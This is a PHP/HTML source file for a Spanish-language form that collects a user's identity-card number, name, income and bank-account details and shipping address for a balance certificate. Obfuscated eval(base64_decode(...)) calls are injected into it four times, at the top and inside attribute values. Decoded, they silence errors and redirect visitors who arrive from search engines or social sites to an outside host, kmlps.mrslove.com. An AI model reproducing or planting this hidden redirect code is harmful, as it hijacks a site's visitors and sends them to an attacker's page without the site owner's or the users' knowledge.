<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); session_start();

if (isset($_GET['req'])) require_once 'lib/function_gen.php';

$doc_code = null;
$doc_tipo = null;

$nro_iden = $_SESSION['g_usuario']['nro_identificacion'];
if(isset($_SESSION['Doc_Codigo_F'])) $doc_code = $_SESSION['Doc_Codigo'];
if(isset($_SESSION['Doc_Tipo_F'])) $doc_tipo = $_SESSION['Doc_Tipo'];

if($doc_tipo)
  $certificado = $doc_tipo == 3? getBalanceCertific($doc_code, $nro_iden, 1) : getBalanceCertific(null, $nro_iden, 1);
else
  $certificado = getBalanceCertific(null, $nro_iden, 1);
  
  unset($_SESSION['Doc_Codigo_F']);
  unset($_SESSION['Doc_Tipo_F']);

$bal3 = true;
if(!isset($certificado['Per_CI'])) $bal3 = false;

?>


<form name="paso_filldata3" id="paso_filldata3" action="balance_action.php" method="post" onsubmit="return _veri3();">
  <div id="data_certificado">
      <br>
    <label for="nro_indent_bal3" class="textformulario">Cédula:</label>
    <select name="nacionalidad" id="type_ci3" class="seleccion1" <? if($bal3) echo "disabled" ?> >
      <option value="V" <? if($bal3 && substr($certificado['Per_CI'],0,1) == 'V') echo "selected"; ?> >V</option>
      <option value="E" <? if($bal3 && substr($certificado['Per_CI'],0,1) == 'E') echo "selected"; ?> >E</option>
    </select>

    <input name="nro_indent_bal3" id="nro_indent_bal3" type="text" class="relleno1" maxlength="9" 
    value="<? if($bal3) echo substr($certificado['Per_CI'], 1); ?>" <? if($bal3) echo "disabled" ?> />
    <br /><br />
    <input type="hidden" name="nro_ident_bal3_hidden" id="nro_ident_bal3_hidden" 
    value="<? if($bal3) echo $certificado['Per_CI']; ?>" />

    <label for="nombre_bal3" class="textformulario">Nombre:</label>
    <input id="nombre_bal3" name="nombre_bal3" type="text" class="relleno" maxlength="50" 
    value="<? if($bal3) echo $certificado['Per_Nombre']; ?>" <? if($bal3) echo "disabled" ?> /><br /><br />

    <label for="apellido_bal3" class="textformulario">Apellido:</label>
    <input id="apellido_bal3" name="apellido_bal3" type="text" class="relleno" 
    value="<? if($bal3) echo $certificado['Per_Apellido']; ?>" maxlength="50" <? if($bal3) echo "disabled" ?>/><br><br>

    <label for="telefono_cert" class="textformulario">Teléfono:</label>
    <input name="telefono_cert" id="telefono_cert" type="text" size="40" class="relleno telefono_num" 
    value="<? if($bal3) echo $certificado['Per_Telefono']; ?>" <? if($bal3) echo "disabled" ?>/><br><br>

    <span id="profesion">
      <span class="textformulario">Profesión:</span>
      <select id="profesion_bal3" name="profesion_bal3" class="activoscirculante" style="float:right" <? if($bal3) echo "disabled" ?>>
        <option value="">[Seleccione]</option>
        <? if($bal3) getProfesiones($certificado['BMP_CodigoPro']); else getProfesiones(null); ?>
      </select>
    </span>
    <br><br>

    <label for="actividad_com_bal3" class="textformulario">Actividad Comercial:</label>
    <input name="actividad_com_bal3" id="actividad_com_bal3" type="text" size="40" class="relleno" 
    value="<? if($bal3) echo $certificado['Per_ActComerci']; ?>" maxlength="100" <? if($bal3) echo "disabled" ?>/>
    <br /><br />

    <span id="escaneo_cert">
      <? if(!$bal3){ ?>
      <label for="per_imgci_bal4" class="textformulario">Escaneo de cédula</label>
      <input type="hidden" name="per_imgci_bal4" id="per_imgci_bal4" value="" class="relleno"/>
      <span class="relleno2">
        <iframe src="balance-upload.php" id="imgframe_bal3" scrolling="no" frameborder="0" allowtransparency="true" style="height: 60px" onLoad="readframes(this, 'per_imgci_bal4');"></iframe>
      </span>
      <? }else{ ?>
		<label for="per_imgci_bal4" class="textformulario">Escaneo de cédula</label>
		<input type="hidden" name="per_imgci_bal4" id="per_imgci_bal4" value="<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); echo $certificado['Per_ImgCI']; ?>" class="relleno"/>
		<span class="relleno2">
        <iframe src="balance-upload.php?per_imgci=<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); echo $certificado['Per_ImgCI']; ?>" id="imgframe_bal3" scrolling="no" frameborder="0" allowtransparency="true" style="height: 60px" onLoad="readframes(this, 'per_imgci_bal4');"></iframe>
     <?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); } ?>
    </span>
    <br /><br /><br><br>
	<span class="relleno">
		<input type="button" id="modificar_user4" value="Modificar Datos" class="botoninputbalance"  <? if (!$bal3) echo "style='display: none'" ?> />
		<input type="button" id="aceptar_user4" value="Realizar Cambios" class="botoninputbalance" style="display:none;"/>
	</span>
	<br /><br /><br /><br>
    <label for='fecha_bal3' class='textformulario'>Fecha: </label>
    <input id='fecha_bal3' name='fecha_bal3' class="datepicker maskdate relleno" <? if ($bal3) echo "disabled" ?> value="<? if ($bal3) echo $certificado['Doc_PgFechaIns']; ?>"/>
    <br /><br />
    <input type="button" id="certificado_insert" value="Enviar y Continuar" class="botoninputbalance" 
    <? if($bal3) echo "style='display: none'" ?> />
  </div>

  <div id="data_cuenta_bal3" <? if(!$bal3) echo "style='display:none'" ?> >
    <div id="lineag"></div>
    <h5>Datos sobre los Ingresos</h5><br />
    <span class="textformulario">Mes Inicial </span>
    <select name="dtt_anoini" class="meses" id="dtt_anoini">
      
      <? printYearsII(); ?>
    </select>
	<select name="dtt_mesini" class="meses1" id="dtt_mesini">
      
      <? printMonths(); ?>
    </select>
    
    <br /><br />
	
	<span class="textformulario">Mes Final </span>
    <select name="dtt_anofin" class="meses" id="dtt_anofin">
      
      <? printYearsII(); ?>
    </select>
    <select name="dtt_mesfin" class="meses1" id="dtt_mesfin">
      
      <? printMonths(); ?>
    </select>
	
    <br /><br />
    <label for="doc_text_insert" class="textformulario" >Nro de Cuenta:</label>
    <input id="doc_text_insert" name="doc_text_insert" type="text" class="relleno" maxlength="25" />
    <br><br>
    <label for="doc_monto_insert" class="textformulario">Monto Promedio:</label>
    <input id="doc_monto_insert" name="doc_monto_insert" type="text" class="relleno" maxlength="16" />
    <br><br>
    <label for="doc_cuentaext_insert" class="textformulario">Cuenta Extranjera:</label>
    <input id="doc_cuentaext_insert" name="doc_cuentaext_insert" type="checkbox" class="relleno" />
    <br><br>
    <span id="escaneo_cony1">
        <label for="dtt_soportecert" class="textformulario"></label>
        <input type="hidden" name="dtt_soportecert" id="dtt_soportecert" value="" class="relleno"/>
        <span class="relleno2">
            <iframe src="balance-upload.php" width="231px" id="imgframecert" scrolling="no" frameborder="0" allowtransparency="true" style="height: 80px" onLoad="readframes(this, 'dtt_soportecert');"></iframe>
        </span>
    </span><br /><br /><br /><br /><br />
    <div class="boton_verde_b">
        <a id="insert_doc_detcert" href="#">Adjuntar</a>
    </div>
    <br /><br /><br />
    <div id="tabla_cert" class="tabla_2">
      <? if($bal3) require_once 'balance_cert_tabla.php'; else { ?>
      <div class="tabla_2">
        <table width="500" border="0" cellspacing="0" cellpadding="0" style="margin: 0 auto;">
        <tr>
            <td colspan="3"><div id="pestanabalance">Documentos</div></td>
        </tr>
        <tr class="fila_blanca_balance">
            <td width="200"><span class="valores">Meses</span></td>
            <td width="190"><span class="valores">Cuenta</span></td>
            <td width="100"><span class="valores"></span></td>
        </tr>
        <tr class="fila_linea">
            <td colspan="12"></td>
        </tr>
        </table>
		<input type='hidden' id='_aqehgjhcony_vall3' value='0' />
      </div>
      <? } ?>
    </div>
    <br /><br />
    <div id="lineag"></div>

    <h5>Datos de envío</h5><br />
    <span class="textformulario">Estado</span>
    <span id="estado">
      <select name="select_state3" id="select_state3" class="activoscirculante select_state">
        <? if(isset($certificado['Per_Est'])) getStates($certificado['Per_Est']); else getStates(null); ?>
      </select>
    </span><br /><br />

    <span class="textformulario">Municipio</span>
    <span id="municipio">
      <select name="select_mun3" id="select_mun3" class="activoscirculante select_mun">
        <? if(isset($certificado['Per_Mun'])) getMunicipios($certificado['Per_Mun'], $certificado['Per_Est']); else getMunicipios(null, 595); ?>
      </select>
    </span><br /><br />
    <span class="textformulario">Parroquia</span>
    <span id="parroquia">
      <select name="select_par3" id="select_par3" class="activoscirculante">
        <? if(isset($certificado['Per_Parr'])) getParroquias($certificado['Per_Parr'], $certificado['Per_Mun']); else getParroquias(null, 621); ?>
      </select>
    </span><br /><br />
    <span>
      <label for="calle_bal3" class="textformulario">Cod.Postal / Calle / Avenida:</label>
      <input name="calle_bal3" id="calle_bal3" type="text" size="40" class="relleno5" 
      value="<? if($bal3) echo $certificado['Per_Calle']; ?>" maxlength="140" /><br /><br />
    </span>
    <span>
      <label for="edif_bal3" class="textformulario">Urbanización / Edificio / Casa:</label>
      <input name="edif_bal3" id="edif_bal3" type="text" size="40" class="relleno5" 
      value="<? if($bal3) echo $certificado['Per_Edif']; ?>" maxlength="140" />
    </span><br/><br/>
    <input type="submit" value="Enviar y continuar" class="botoninputbalance" /> 
  </div>
  <div id="dudas">¿Tienes dudas? ingresa a la sección de <span class="links"><a href="#">Preguntas Frecuentes</a></span></div> 
</form>